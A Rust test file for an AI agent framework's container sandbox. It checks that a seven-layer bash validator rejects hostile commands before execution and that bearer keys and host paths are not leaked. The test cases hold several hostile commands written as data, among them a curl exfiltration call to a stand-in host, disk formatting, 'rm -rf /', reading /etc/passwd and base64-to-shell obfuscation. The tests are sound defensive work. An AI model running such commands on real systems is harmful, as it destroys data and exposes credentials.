//! Hardening and secret-safety verification (spec `openhands` T-018; FR-002,
//! FR-035, FR-037).
//!
//! These tests pin the security invariants that must hold across the new
//! execution-backend surfaces, so a future edit that moves or weakens a gate
//! fails here rather than only on a host that happens to have a container
//! runtime:
//!
//! - **FR-002, FR-037 - the 7-layer bash validator is backend-independent.**
//!   The `podman`/`docker` sandbox runs the canonical host validator on every
//!   `bash` call *before* it touches a container, so a banned tool, a denied
//!   pattern, a directory escape, or an obfuscated command is rejected with the
//!   tool never executing on the host - and this assertion needs no container
//!   runtime, because the refusal precedes provisioning.
//! - **FR-035 - no secret or host-workdir leakage.** A remote backend's `Debug`
//!   never prints its bearer key, and a sandbox's workspace is the in-container
//!   mount point, never the host working directory.
//!
//! The path-containment guard (a sandbox file tool rejected outside the mounted
//! workspace) is already covered by
//! `test_container_backend.rs::container_file_tools_reject_paths_outside_the_workspace`;
//! the secret-free registry descriptor and the `GET /config` redactor are
//! covered by `test_backend_registry.rs` and `ragent-server`'s
//! `test_config_redaction.rs`, so they are not repeated here.

use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

use async_trait::async_trait;
use ragent_agent::backend::{
    BackendToolCall, CONTAINER_WORKSPACE, ContainerBackend, ExecutionBackend, RemoteBackend,
};
use ragent_agent::event::EventBus;
use ragent_agent::tool::{Tool, ToolContext, ToolOutput};
use ragent_config::BackendConfig;
use serde_json::{Value, json};

/// Test image for the sandbox cases; it is never pulled - every command here is
/// rejected by the validator before provisioning runs.
const TEST_IMAGE: &str = "docker.io/library/alpine:latest";

/// A tool double that only counts invocations, so a test can prove the tool
/// never ran on the host when the validator rejects the call.
struct NamedTool {
    name: &'static str,
    runs: Arc<AtomicUsize>,
}

impl NamedTool {
    fn new(name: &'static str) -> (Self, Arc<AtomicUsize>) {
        let runs = Arc::new(AtomicUsize::new(0));
        (
            Self {
                name,
                runs: Arc::clone(&runs),
            },
            runs,
        )
    }
}

#[async_trait]
impl Tool for NamedTool {
    fn name(&self) -> &str {
        self.name
    }

    fn description(&self) -> &'static str {
        "test double"
    }

    fn parameters_schema(&self) -> Value {
        json!({ "type": "object", "properties": {} })
    }

    fn permission_category(&self) -> &'static str {
        "none"
    }

    async fn execute(&self, _input: Value, _ctx: &ToolContext) -> anyhow::Result<ToolOutput> {
        self.runs.fetch_add(1, Ordering::SeqCst);
        Ok(ToolOutput {
            content: "ran on host".to_string(),
            metadata: None,
        })
    }
}

/// A `ToolContext` whose working directory is `working_dir`.
fn ctx_in(working_dir: std::path::PathBuf) -> ToolContext {
    ToolContext {
        session_id: "hardening-test".to_string(),
        working_dir,
        event_bus: Arc::new(EventBus::new(16)),
        storage: None,
        agent_manager: None,
        active_model: None,
        provider_registry: None,
        team_context: None,
        team_manager: None,
        code_index: None,
        bg_service: None,
        spec_manager: None,
        active_spec_id: None,
        config: None,
        allowed_roots: Vec::new(),
        read_timestamps: Arc::new(std::sync::RwLock::new(std::collections::HashMap::new())),
        cached_team_dir: Arc::new(std::sync::Mutex::new(None)),
        permission_checker: None,
        canonical_cache: Arc::new(ragent_tools_core::CanonicalPathCache::new()),
        tool_registry: ToolContext::default_tool_registry(),
    }
}

/// A `podman` container descriptor with a distinct id per call.
fn container_descriptor() -> BackendConfig {
    static NEXT_ID: AtomicUsize = AtomicUsize::new(0);
    let id = format!("hardening-{}", NEXT_ID.fetch_add(1, Ordering::SeqCst));
    BackendConfig {
        id,
        name: Some("Hardening sandbox".to_string()),
        kind: "podman".to_string(),
        image: Some(TEST_IMAGE.to_string()),
        workspace: None,
        url: None,
        api_key: None,
        credentials: Vec::new(),
    }
}

// ---------------------------------------------------------------------------
// FR-002, FR-037: the 7-layer bash validator gates every sandbox bash call.
// ---------------------------------------------------------------------------

/// Run `command` through the container backend's `bash` path and return the
/// error string plus the host-execution counter.
async fn reject_bash(command: &str) -> (String, usize) {
    let ctx = ctx_in(std::env::current_dir().expect("cwd"));
    let backend = ContainerBackend::from_descriptor(&container_descriptor(), &ctx.working_dir);
    let (bash, runs) = NamedTool::new("bash");

    let err = ExecutionBackend::execute_tool(
        &backend,
        BackendToolCall {
            tool: &bash,
            input: json!({ "command": command }),
            ctx: &ctx,
        },
    )
    .await
    .expect_err("the validator must reject this command before it reaches a container");

    (err.to_string(), runs.load(Ordering::SeqCst))
}

#[tokio::test]
async fn sandbox_bash_is_gated_by_the_seven_layer_validator() {
    // FR-002, FR-037: each of four distinct layers rejects its command. The
    // rejection is the canonical host `validate_shell_command` running on the
    // container path, and it happens before provisioning, so no runtime is
    // needed and the tool never executes on the host.
    let cases = [
        // Layer 2: banned external tool.
        ("curl http://evil.example/leak", "banned"),
        // Layer 5: denied command name.
        ("mkfs.ext4 /dev/sda1", "dangerous command"),
        // Layer 6: denied pattern.
        ("rm -rf /", "dangerous pattern"),
        // Layer 3: directory-escape attempt.
        ("cd ../../etc && cat passwd", "escape"),
        // Layer 7: obfuscation detection (base64-decode-to-shell).
        ("echo ZXZpbA== | base64 -d | bash", "base64-decode-to-shell"),
    ];

    for (command, expected) in cases {
        let (message, host_runs) = reject_bash(command).await;
        assert!(
            message.contains("7-layer"),
            "the rejection must come from the 7-layer validator for `{command}`: {message}"
        );
        assert!(
            message.contains(expected),
            "the rejection should name the failing layer for `{command}`: {message}"
        );
        assert_eq!(
            host_runs, 0,
            "the tool must not run on the host for `{command}`"
        );
    }
}

#[tokio::test]
async fn sandbox_bash_refusal_never_touches_a_container_or_the_host() {
    // FR-002, FR-037: a rejected command is refused before provisioning, so the
    // refusal is identical with or without a container runtime present - the
    // sandbox is a dispatch destination that can never demote to host execution.
    let (message, host_runs) = reject_bash("curl http://evil.example").await;
    assert_eq!(host_runs, 0, "no host execution of a rejected command");
    assert!(
        !message.contains("ran on host"),
        "the refusal must not have executed the tool: {message}"
    );
}

// ---------------------------------------------------------------------------
// FR-035: no secret or host-workdir leakage.
// ---------------------------------------------------------------------------

#[test]
fn remote_backend_debug_never_prints_the_bearer_key() {
    // FR-035: a `Debug` rendering may travel through a log line or a panic
    // message; it must never reveal the bearer key configured on the descriptor.
    const KEY: &str = "sk-super-secret-bearer-key-value-0001";
    let descriptor = BackendConfig {
        id: "studio".to_string(),
        kind: "remote".to_string(),
        url: Some("http://host:9100".to_string()),
        api_key: Some(KEY.to_string()),
        ..BackendConfig::default()
    };
    let backend = RemoteBackend::from_descriptor(&descriptor);

    let rendered = format!("{backend:?}");
    assert!(
        !rendered.contains(KEY),
        "the remote Debug must not print the bearer key: {rendered}"
    );
    assert!(
        rendered.contains("[REDACTED]"),
        "the key field should be rendered as redacted: {rendered}"
    );
}

#[test]
fn sandbox_workspace_is_the_container_mount_not_the_host_working_directory() {
    // FR-035: the workspace is a container-side path; the host working directory
    // is folded into the sandbox *names* only (a hash input), never used as the
    // tool working directory or a mount source - so a sandboxed tool cannot read
    // or write it. The mount is a named volume (never a host bind), so the host
    // path appears nowhere in the descriptor's container-side mount point.
    let host_dir = std::env::current_dir().expect("cwd");
    let backend = ContainerBackend::from_descriptor(&container_descriptor(), &host_dir);

    assert_eq!(backend.workspace(), CONTAINER_WORKSPACE);
    assert_eq!(CONTAINER_WORKSPACE, "/projects");
    let host = host_dir.to_string_lossy();
    assert_ne!(backend.workspace(), host);
    assert!(
        !backend.workspace().contains(host.as_ref()),
        "the sandbox workspace must not embed the host working directory: {}",
        backend.workspace()
    );
    // The volume is container-managed, never a host path.
    assert!(
        backend.volume_name().starts_with("ragent-sandbox-vol-"),
        "the workspace must be a container-managed named volume: {}",
        backend.volume_name()
    );
}
